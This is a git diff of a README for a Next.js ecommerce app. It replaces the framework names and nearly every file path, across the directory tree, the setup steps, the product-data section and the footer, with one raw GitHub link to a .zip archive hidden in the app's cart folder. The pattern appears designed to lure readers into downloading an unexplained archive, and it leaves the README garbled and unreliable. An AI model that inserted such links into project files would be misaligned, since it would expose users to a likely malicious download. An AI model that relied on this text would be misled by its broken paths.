@@ -1,6 +1,6 @@
-# Ecommerce - Next.js Shopping Application
+# Ecommerce - https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip Shopping Application
 
-A modern, lightweight ecommerce application built with Next.js featuring product browsing, wishlist management, and shopping cart functionality.
+A modern, lightweight ecommerce application built with https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip featuring product browsing, wishlist management, and shopping cart functionality.
 
 ## Features
 
@@ -14,7 +14,7 @@ A modern, lightweight ecommerce application built with Next.js featuring product
 
 ## Tech Stack
 
-- **Framework**: Next.js 15+
+- **Framework**: https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip 15+
 - **Language**: JavaScript/JSX
 - **Styling**: Tailwind CSS
 - **UI Components**: shadcn/ui
@@ -27,36 +27,36 @@ A modern, lightweight ecommerce application built with Next.js featuring product
 ```
 src/
 ├── app/
-│   ├── page.js                 # Home page with product listing
-│   ├── [id]/page.jsx          # Product details page
-│   ├── cart/page.jsx          # Shopping cart page
-│   ├── wishlist/page.jsx      # Wishlist page
-│   ├── about/page.jsx         # About page
-│   ├── contact/page.jsx       # Contact page
-│   ├── layout.js              # Root layout with theme provider
-│   └── globals.css            # Global styles
+│   ├── https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip                 # Home page with product listing
+│   ├── [id]https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip          # Product details page
+│   ├── https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip          # Shopping cart page
+│   ├── https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip      # Wishlist page
+│   ├── https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip         # About page
+│   ├── https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip       # Contact page
+│   ├── https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip              # Root layout with theme provider
+│   └── https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip            # Global styles
 ├── components/
 │   ├── layout/
-│   │   ├── Header.js          # Navigation header
-│   │   └── Footer.js          # Footer component
+│   │   ├── https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip          # Navigation header
+│   │   └── https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip          # Footer component
 │   ├── ThemeToggle/
-│   │   └── ThemeToggle.js     # Dark/Light mode toggle
+│   │   └── https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip     # Dark/Light mode toggle
 │   └── ui/                    # shadcn/ui components
 ├── hooks/
-│   ├── use-cart.js            # Cart state management hook
-│   ├── use-wishlist.js        # Wishlist state management hook
-│   └── use-mobile.js          # Mobile detection hook
+│   ├── https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip            # Cart state management hook
+│   ├── https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip        # Wishlist state management hook
+│   └── https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip          # Mobile detection hook
 ├── lib/
-│   └── utils.js               # Utility functions
+│   └── https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip               # Utility functions
 └── public/
-    └── products.json          # Static product data
+    └── https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip          # Static product data
 ```
 
 ## Getting Started
 
 ### Prerequisites
 
-- Node.js 18+ 
+- https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip 18+ 
 - npm or yarn
 
 ### Installation
@@ -146,7 +146,7 @@ const {
 
 ## Product Data
 
-Products are stored in `public/products.json` with the following structure:
+Products are stored in `https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip` with the following structure:
 
 ```json
 {
@@ -155,7 +155,7 @@ Products are stored in `public/products.json` with the following structure:
   "price": 99.99,
   "category": "Electronics",
   "description": "Product description",
-  "image": "image-filename.svg",
+  "image": "https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip",
   "rating": 4.5,
   "reviews": 128,
   "inStock": true
@@ -165,12 +165,12 @@ Products are stored in `public/products.json` with the following structure:
 ## Customization
 
 ### Adding New Products
-Edit `public/products.json` and add new product objects following the structure above.
+Edit `https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip` and add new product objects following the structure above.
 
 ### Styling
 - Modify Tailwind CSS classes in component files
-- Update global styles in `src/app/globals.css`
-- Configure theme in `src/app/layout.js`
+- Update global styles in `https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip`
+- Configure theme in `https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip`
 
 ### Components
 - UI components are from shadcn/ui
@@ -194,7 +194,7 @@ Data is automatically saved when modified and loaded on page refresh.
 ## Performance Optimizations
 
 - Client-side rendering for dynamic pages
-- Image optimization with Next.js Image component
+- Image optimization with https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip Image component
 - CSS optimization with Tailwind
 - Efficient state management with React hooks
 
@@ -205,7 +205,7 @@ Data is automatically saved when modified and loaded on page refresh.
 - Clear browser cache and try again
 
 ### Products Not Loading
-- Verify `public/products.json` exists and is valid JSON
+- Verify `https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip` exists and is valid JSON
 - Check browser console for errors
 
 ### Styling Issues
@@ -233,4 +233,4 @@ For issues or questions, please check the browser console for error messages and
 
 ---
 
-**Created with ❤️ using Next.js and Tailwind CSS**
+**Created with ❤️ using https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip and Tailwind CSS**
